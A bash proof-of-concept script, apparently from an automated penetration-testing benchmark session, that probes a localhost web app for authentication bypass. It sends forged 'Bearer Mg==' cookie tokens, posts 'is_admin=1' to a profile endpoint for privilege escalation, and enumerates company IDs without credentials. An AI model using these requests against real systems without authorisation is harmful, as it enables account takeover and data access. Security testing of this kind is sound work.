#!/bin/bash
# POC: Test if endpoints are accessible without valid authentication or if authentication is truly required
# Target: ./repo
# Created: 2025-11-10T14:52:42.427Z
# Session: benchmark-XBEN-021-24-mht8yjkr

TARGET="http://localhost:8080"

echo "=========================================="
echo "Authentication Bypass - Endpoint Access Test"
echo "=========================================="
echo ""

# Test 1: Try to access /edit_profile without any token (from existing findings)
echo "[TEST 1] Accessing /edit_profile/1 without token..."
RESP=$(curl -s -w "\nHTTP_CODE:%{http_code}" "$TARGET/edit_profile/1")
echo "Response: $RESP"
echo ""

# Test 2: Try POST to /edit_profile without token
echo "[TEST 2] POST to /edit_profile/1 without token (form data)..."
RESP=$(curl -s -w "\nHTTP_CODE:%{http_code}" -X POST "$TARGET/edit_profile/1" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=Hacked&is_admin=1")
echo "Response: $RESP"
echo ""

# Test 3: Try with forged token in cookie
echo "[TEST 3] POST to /edit_profile/1 with forged token (Bearer Mg==)..."
RESP=$(curl -s -w "\nHTTP_CODE:%{http_code}" -X POST "$TARGET/edit_profile/1" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: user_token=Bearer Mg==" \
  -d "name=Hacked&is_admin=1")
echo "Response: $RESP"
echo ""

# Test 4: Try GET on company endpoint with forged token
echo "[TEST 4] GET /company/1 with forged token..."
RESP=$(curl -s -w "\nHTTP_CODE:%{http_code}" "$TARGET/company/1" \
  -H "Cookie: user_token=Bearer Mg==")
echo "Response: $RESP"
echo ""

# Test 5: Check if endpoints exist at all by looking for 404 vs 401/403
echo "[TEST 5] Checking endpoint existence..."
ENDPOINTS="/edit_profile/1 /company/1 /dashboard /home /api/company/1"
for ep in $ENDPOINTS; do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$ep")
    echo "GET $ep -> HTTP $CODE"
done
echo ""

# Test 6: Try to POST directly to /token without username/password
echo "[TEST 6] POST to /token with empty body..."
RESP=$(curl -s -w "\nHTTP_CODE:%{http_code}" -X POST "$TARGET/token" \
  -H "Content-Type: application/x-www-form-urlencoded")
echo "Response: $RESP"
echo ""

# Test 7: Check if there's a cookie-based session bypass
echo "[TEST 7] Check /company endpoint directly (might not need auth)..."
for ID in 1 2 3; do
    RESP=$(curl -s -w "\nHTTP_CODE:%{http_code}" "$TARGET/company/$ID" \
      -H "Accept: application/json")
    CODE=$(echo "$RESP" | grep "HTTP_CODE" | cut -d: -f2)
    echo "GET /company/$ID -> HTTP $CODE"
done
echo ""

echo "=========================================="
echo "ANALYSIS: Can endpoints be accessed?"
echo "=========================================="
echo "If we get 200/404, endpoints exist and might be accessible"
echo "If we get 401/403, they require authentication"
echo "If we get redirects, authentication is enforced"